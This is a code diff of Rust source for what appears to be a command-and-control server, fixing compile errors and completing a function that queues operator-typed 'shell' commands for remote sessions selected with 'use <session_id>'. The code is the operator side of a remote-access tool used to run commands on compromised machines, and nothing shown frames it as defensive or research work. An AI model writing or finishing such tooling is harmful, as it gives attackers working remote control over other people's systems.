@@ -246,9 +246,9 @@ async fn interact_session(state: Arc<AppState>, session_id: &str) {
         std::io::stdout().flush().unwrap();
 
         let mut input = String::new();
-        if std::io::stdin().read_line(& input).is_err() {
+        if std::io::stdin().read_line(&mut input).is_err() {
             break;
-        } 
+        }
         let input = input.trim();
         if input.is_empty() {
             continue;
@@ -263,7 +263,7 @@ async fn interact_session(state: Arc<AppState>, session_id: &str) {
                 } else {
                     input
                 };
-                queue_command(state, session_id, "shell", vec![cmd.to_string()]).await;
+                queue_command(state.clone(), session_id, "shell", vec![cmd.to_string()]).await;
             }
         }
     }
@@ -279,8 +279,18 @@ async fn queue_command(state: Arc<AppState>, session_id: &str, cmd_type: &str, a
         timeout: None,
     };
 
-    
+    let mut pending = state.pending_command.write().await;
+    pending.entry(session_id.to_string()).or_insert_with(Vec::new).push(cmd);
 
+    let display_args: Vec<String> = args.iter().map(|a| {
+        if a.len() > 64 {
+            format!("<{} bytes>", a.len())
+        } else {
+            a.clone()
+        }
+    }).collect();
+
+    println!("  [*] Queued {} [{}] for {} -> {:?}", cmd_type, id, session_id, display_args);
 }
 
 async fn cli_loop(state: Arc<AppState>) {
@@ -306,7 +316,7 @@ async fn cli_loop(state: Arc<AppState>) {
                 if parts.len() < 2 {
                     println!("[-] Usage: use <session_id>");
                 } else {
-                    interact_session(&state, parts[1]).await;
+                    interact_session(state.clone(), parts[1]).await;
                 }
             }
             _ => println!("x Unkown command: {}", parts[0]),
